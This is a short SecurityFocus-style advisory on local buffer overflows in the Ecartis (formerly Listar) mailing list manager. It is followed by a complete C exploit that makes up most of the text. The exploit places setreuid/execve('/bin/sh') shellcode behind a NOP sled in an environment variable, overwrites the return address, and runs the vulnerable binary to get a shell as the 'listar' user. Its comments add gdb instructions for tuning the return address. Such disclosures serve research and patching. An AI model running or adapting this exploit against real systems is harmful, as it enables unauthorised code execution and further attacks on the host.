source: http://www.securityfocus.com/bid/4271/info
 
Ecartis is the new name for the Listar software product. Listar is a mailing list management package for Linux, BSD, and other Unix like operating systems.
 
Multiple local buffer overflow conditions have been reported in some versions of Ecartis. If successfully exploited, this may result in the execution of arbitrary code. Listar normally runs as the non-privileged user 'listar'. Exploitation of this vulnerability may allow the malicious party to launch further attacks against the system as the user 'listar'. 

/* 
 * /home/ecartis/ecartis
 *
 * The vulnerability was found by KF / Snosoft (http://www.snosoft.com)
 * Exploit coded up by The Itch / Promisc (http://www.promisc.org)
 * Shellcode created by r0z / Promisc (r0z@promisc.org)
 * 
 * This exploit was developed on the Snosoft vulnerability research machines
 *
 * - The Itch
 * - itchie@promisc.org
 *
 * - Technical details concerning the exploit -
 * 
 * 1) Buffer overflow occurs after writing 996 bytes into the buffer at the command line
 *    (996 to overwrite ebp, 1000 to overwrite eip).
 * 2) The code string with the return address will be unaligned.
 * 3) Shellcode will try to do a setreuid(508);
 *
 * I had trouble reaching my own buffer in the enviroment dynamicly, so i gdb'ed it.
 * If the exploit fails, comment the system() that runs ecarthis, uncomment the other system()
 * The run this exploit, you will be in bash then, do: gdb /home/ecartis/ecartis
 * in gdb, type: run $RET
 * The program will probably then segfault, then type: x/200x $esp and press enter a couply of times
 * until you see alot of 0x90909090. Then pick on of those address and replace it with the 
 * int get_sp = 0xbffff550. Change the system() commands below back as how they were and rerun the exploit. 
 *
 */

#include <stdio.h>
#include <stdlib.h>

#define DEFAULT_EGG_SIZE 2048
#define NOP 0x90
#define DEFAULT_BUFFER_SIZE 1000


/* setreuid(508); execve("/bin/sh", "sh", 0); (c) r0z@promisc.org */
char shellcode[] =
         "\x31\xdb"              /* xor   %ebx, %ebx     */
         "\x31\xc9"              /* xor   %ecx, %ecx     */
         "\xf7\xe3"              /* mul   %ebx           */
         "\xb0\x46"              /* mov   $0x46, %al     */
         "\x66\xbb\xfc\x01"      /* mov   $0x1fc, %bx    */
         "\x49"                  /* dec   %ecx           */
         "\xcd\x80"              /* int   $0x80          */
         "\x31\xd2"              /* xor   %edx, %edx     */
         "\x52"                  /* push  %edx           */
         "\x68\x6e\x2f\x73\x68"  /* push  $0x68732f6e    */
         "\x68\x2f\x2f\x62\x69"  /* push  $0x69622f2f    */
         "\x89\xe3"              /* mov   %esp, %ebx     */
         "\x52"                  /* push  %edx           */
         "\x53"                  /* push  %ebx           */
         "\x89\xe1"              /* mov   %esp, %ecx     */
         "\x6a\x0b"              /* pushl $0xb           */
         "\x58"                  /* pop   %eax           */
         "\xcd\x80";             /* int   $0x80          */

int main(int argc, char *argv[])
{
        char *buff;
        char *egg;
        char *ptr;
        long *addr_ptr;
        long addr;
        int bsize = DEFAULT_BUFFER_SIZE;
        int eggsize = DEFAULT_EGG_SIZE;
        int i;
	int get_sp = 0xbffff550;
	
        if(argc > 1) { bsize = atoi(argv[1]); }

        if(!(buff = malloc(bsize)))
        {
                printf("unable to allocate memory for %d bytes\n", bsize);
                exit(1);
        }

        if(!(egg = malloc(eggsize)))
        {
                printf("unable to allocate memory for %d bytes\n", eggsize);
                exit(1);
        }
	
	printf("/home/ecartis/ecartis\n");
	printf("Vulnerability found by KF / http://www.snosoft.com\n");
        printf("Coded by The Itch / http://www.promisc.org\n\n");
        printf("Using return address: 0x%x\n", get_sp);
        printf("Using buffersize    : %d\n", bsize);

	/* alignment */
        ptr = buff + 2;

        addr_ptr = (long *) ptr;
        for(i = 0; i < bsize; i+=4) { *(addr_ptr++) = get_sp; }

        ptr = egg;
        for(i = 0; i < eggsize - strlen(shellcode) -1; i++)
        {
                *(ptr++) = NOP;
        }

        for(i = 0; i < strlen(shellcode); i++)
        {
                *(ptr++) = shellcode[i];
        }

        egg[eggsize - 1] = '\0';
        memcpy(egg, "EGG=", 4);
	putenv(egg);
	buff[bsize - 1] = '\0';
	memcpy(buff, "RET=", 4);
	putenv(buff);
	system("/home/ecartis/ecartis $RET");
//	system("/bin/bash");

        return 0;
}
